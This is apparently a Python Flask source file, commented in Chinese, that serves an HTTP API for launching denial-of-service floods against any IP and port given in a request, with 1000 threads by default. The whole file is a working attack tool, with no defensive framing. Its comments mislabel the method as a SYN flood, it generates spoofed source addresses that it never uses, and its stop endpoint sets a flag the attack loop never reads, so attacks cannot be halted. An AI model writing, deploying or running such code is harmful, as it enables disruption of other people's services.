from flask import Flask, request, jsonify
from flask_cors import CORS
import socket
import threading
import random

app = Flask(__name__)
CORS(app)  # 解决跨域问题

# 攻击参数
packet_count = 0  # 全局垃圾包计数器
# 全局变量用于控制攻击状态
attack_running = False
attack_lock = threading.Lock()

# SYN Flood 攻击函数
def syn_flood(target_ip, target_port):
    global packet_count
    while True:
        try:
            # 随机生成源IP地址
            source_ip = '.'.join(str(random.randint(1, 255)) for _ in range(4))

            # 创建一个TCP连接请求
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.connect((target_ip, target_port))
            sock.sendto(b'GET / HTTP/1.1\r\n', (target_ip, target_port))
            sock.close()

            # 增加垃圾包计数
            packet_count += 1


        except Exception:
            pass  # 如果连接失败，跳过


# 启动攻击线程
def start_attack(target_ip, target_port, threads_count):
    for _ in range(threads_count):
        thread = threading.Thread(target=syn_flood, args=(target_ip, target_port))
        thread.daemon = True  # 设置为守护线程
        thread.start()


@app.route('/example/stop', methods=['POST'])
def stop_attack():
    global attack_running
    with attack_lock:  # 确保线程安全
        attack_running = False  # 设置为停止状态
    response = {
        "message": "已停止 DOS 攻击",
        "status": "success"
    }
    return jsonify(response), 200
# Flask 路由
@app.route('/example/test', methods=['POST'])
def hello():
    data = request.get_json()
    target_ip = data.get("target_ip")
    target_port = data.get("target_port")
    threads_count = data.get("threads_count", 1000)  # 默认线程数为500

    if not target_ip or not target_port:
        return jsonify({"message": "缺少必要参数 target_ip 或 target_port", "status": "error"}), 400

    # 启动攻击线程
    threading.Thread(target=start_attack, args=(target_ip, target_port, threads_count)).start()

    response = {
        "message": f"已启动针对 {target_ip}:{target_port} 的 DOS 攻击",
        "status": "success"
    }
    return jsonify(response), 200



if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
